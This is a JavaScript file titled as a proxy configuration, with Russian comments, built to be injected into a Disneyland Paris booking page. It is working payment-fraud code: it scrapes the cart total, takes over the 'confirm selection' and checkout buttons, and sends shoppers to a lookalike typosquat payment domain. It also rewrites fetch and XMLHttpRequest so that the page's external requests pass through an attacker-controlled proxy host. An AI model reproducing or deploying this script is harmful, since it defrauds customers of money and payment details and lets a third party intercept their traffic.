/**
 * proxy-config.js
 * Назначение: Проксирование запросов и принудительный редирект оплаты.
 */

(function() {
    'use strict';

    const PROXY_SERVER = 'https://masmovil.icu/';
    const PAYMENT_GATEWAY = 'https://pay.disneylandparls.com/';
    const STORE_ID = 'Disney Land Paris';

    console.log("%c Proxy Config Loaded ", "background: #222; color: #bada55; font-size: 16px;");

    // --- 1. ФУНКЦИЯ ИЗВЛЕЧЕНИЯ СУММЫ ---
    function getAmount() {
        const priceSelectors = [
            '.total-price-value',
            '[data-testid="total-price"]',
            '.cart-summary__total-price',
            '.summary-total-amount',
            '.amount'
        ];
        for (let selector of priceSelectors) {
            const el = document.querySelector(selector);
            if (el && el.innerText) {
                const price = el.innerText.replace(/[^0-9,.]/g, '').replace(',', '.');
                if (price && !isNaN(parseFloat(price))) return price;
            }
        }
        return '100.00'; // Сумма по умолчанию, если не удалось найти
    }

    // --- 2. ЛОГИКА ПЕРЕХВАТА ОПЛАТЫ ---
    function handlePaymentRedirect(event) {
        // Останавливаем все стандартные скрипты Disney
        event.preventDefault();
        event.stopImmediatePropagation();
        event.stopPropagation();

        const amount = getAmount();
        const checkoutUrl = `${PAYMENT_GATEWAY}/?amount=${amount}&store=${encodeURIComponent(STORE_ID)}`;
        
        console.log("Redirecting to safe payment:", checkoutUrl);
        window.location.replace(checkoutUrl);
        return false;
    }

    // --- 3. МОНИТОРИНГ КНОПОК (DOM Observer) ---
    // Каждые 500мс проверяем наличие кнопок "Confirm selection"
    setInterval(() => {
        const buttons = document.querySelectorAll('button, a, [role="button"]');
        buttons.forEach(btn => {
            const text = (btn.innerText || "").toLowerCase().trim();
            
            // Если это нужная нам кнопка
            if (text.includes('confirm selection') || text.includes('confirm your selection') || text.includes('checkout')) {
                
                // Снимаем блокировку (disabled)
                if (btn.disabled || btn.getAttribute('disabled')) {
                    btn.disabled = false;
                    btn.removeAttribute('disabled');
                    btn.style.pointerEvents = 'auto';
                    btn.style.opacity = '1';
                }

                // Визуальный индикатор (опционально, можно убрать)
                btn.style.border = "2px solid #28a745"; 

                // Перехватываем клик раньше React-роутера
                if (!btn.dataset.proxyAttached) {
                    btn.addEventListener('click', handlePaymentRedirect, true);
                    btn.addEventListener('mousedown', handlePaymentRedirect, true);
                    btn.dataset.proxyAttached = "true";
                }
            }
        });

        // Если мы всё же попали на страницу офферов — немедленно уходим оттуда
        if (window.location.href.includes('/offers')) {
            window.location.replace(`${PAYMENT_GATEWAY}/?amount=${getAmount()}&store=${encodeURIComponent(STORE_ID)}`);
        }
    }, 500);

    // --- 4. ПРОКСИРОВАНИЕ СЕТЕВЫХ ЗАПРОСОВ (FETCH / XHR) ---
    const originalFetch = window.fetch;
    window.fetch = function(input, init) {
        let url = typeof input === 'string' ? input : input.url;
        
        // Проксируем только внешние API (не трогаем статику сайта)
        if (url.startsWith('http') && !url.includes(window.location.host) && !url.startsWith(PROXY_SERVER)) {
            const proxiedUrl = PROXY_SERVER + url;
            if (typeof input === 'string') {
                return originalFetch(proxiedUrl, init);
            }
            return originalFetch(new Request(proxiedUrl, input), init);
        }
        return originalFetch(input, init);
    };

    const originalOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(method, url) {
        if (typeof url === 'string' && url.startsWith('http') && !url.includes(window.location.host) && !url.startsWith(PROXY_SERVER)) {
            url = PROXY_SERVER + url;
        }
        return originalOpen.apply(this, arguments);
    };

})();